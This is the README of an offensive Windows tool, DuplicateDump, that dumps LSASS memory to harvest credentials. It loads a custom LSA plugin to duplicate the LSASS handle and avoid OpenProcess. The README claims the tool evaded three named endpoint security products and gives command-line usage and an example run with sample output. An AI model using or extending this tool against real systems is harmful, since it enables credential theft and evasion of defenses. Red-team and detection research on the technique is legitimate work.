# DuplicateDump 
DuplicateDump is a fork of [MirrorDump](https://github.com/CCob/MirrorDump) with following modifications:

- DInovke implementation
- LSA plugin DLL written in C which could be clean up after dumping LSASS. MirrorDump compile LSA plugin as .NET assembly which would not be unloaded by LSASS process. That's why MirrorDump failed to delete the plugin.
- PID of dump process (i.e., DuplicateDump) is shared to LSA plugin through named pipe
- Passing value "0" instead of LSASS PID to MiniDumpWriteDump. This prevent MiniDumpWriteDump from opening its own handle to LSASS

DuplicateDump add custom LSA plugin that duplicate LSASS process handle from the LSASS process to DuplicateDump. So DuplicateDump has a ready to use process handle to LSASS without invoking OpenProcess.

## Testing

By loading DuplicateDump in memory, it was able to dump LSASS memory without detection o

- Cortex XDR
- Kaspersky Enterprise
- Windows Defender

## Usage

Compile LSA plugin (export either SpLsaModeInitialize or dllMain function) and provide the full path of DLL to DuplicateDump

```shell
.\DuplicateDump.exe --help
  -f, --filename=VALUE       The path to write the dump file to
  -p, --plugin=VALUE         Full file path to LSA plugin
  -c, --compress             GZip and delete the dump file on disk
  -d, --DebugPriv            Obtain SeDebugPrivilege
  -h, --help                 Display this help
```

Example 

```
.\DuplicateDump.exe -f test -c -p C:\LSAPlugin.dll
[+] Loading LSA security package
[+] Named pipe connected and replying with current PID 6492
[+] Found duplicated LSASS process handle 0x3d0
[+] Compressed dump file saved to test.gz
```

## Improvement

- DuplicateDump use DInvoke to call API AddSecurityPackage to load a LSA plugin. You could use RPC call without having to invoke that API call directly. Check details in XPN's [blog post](https://blog.xpnsec.com/exploring-mimikatz-part-2/)

- Recently, splinter_code discovered that SecLogon could be leveraged to dump LSASS. Strongly recommend you to study his [blog post](https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-2.html).

## References

* https://github.com/CCob/MirrorDump
* https://rastamouse.me/dumping-lsass-with-duplicated-handles/
* https://github.com/jfmaes/SharpHandler

